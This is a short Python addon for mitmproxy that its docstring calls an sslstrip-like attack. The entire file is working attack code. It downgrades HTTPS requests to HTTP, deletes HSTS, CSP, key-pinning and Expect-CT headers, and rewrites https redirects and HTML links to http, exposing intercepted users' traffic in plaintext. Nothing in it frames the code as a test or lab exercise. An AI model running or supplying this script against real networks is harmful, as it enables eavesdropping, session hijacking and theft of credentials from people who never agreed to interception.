"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
from mitmproxy import http
from mitmproxy import ctx
import re

class SSLStrip:
    def load(self, loader):
        ctx.log.info("SSLStrip addon loaded")

    def request(self, flow: http.HTTPFlow) -> None:
        # Downgrade outgoing requests if needed
        if flow.request.pretty_url.startswith("https://"):
            http_url = flow.request.pretty_url.replace("https://", "http://", 1)

            ctx.log.info(f"Downgrading request: {flow.request.pretty_url}")

            flow.request.scheme = "http"
            flow.request.url = http_url

    def response(self, flow: http.HTTPFlow) -> None:
        if not flow.response:
            return

        headers = flow.response.headers

        # Remove HTTPS enforcement headers
        for h in [
            "strict-transport-security",
            "content-security-policy",
            "public-key-pins",
            "expect-ct",
        ]:
            if h in headers:
                del headers[h]

        # Rewrite redirects
        if "location" in headers:
            location = headers["location"]

            if location.startswith("https://"):
                headers["location"] = location.replace(
                    "https://",
                    "http://",
                    1,
                )

                ctx.log.info(
                    f"Rewrote redirect: {location} -> {headers['location']}"
                )

        # Rewrite HTML body links
        content_type = headers.get("content-type", "")

        if "text/html" in content_type:
            try:
                text = flow.response.get_text()

                # Rewrite HTTPS references
                text = re.sub(
                    r"https://",
                    "http://",
                    text,
                    flags=re.IGNORECASE,
                )

                flow.response.set_text(text)

            except Exception as e:
                ctx.log.warn(f"Body rewrite failed: {e}")

addons = [
    SSLStrip()
]
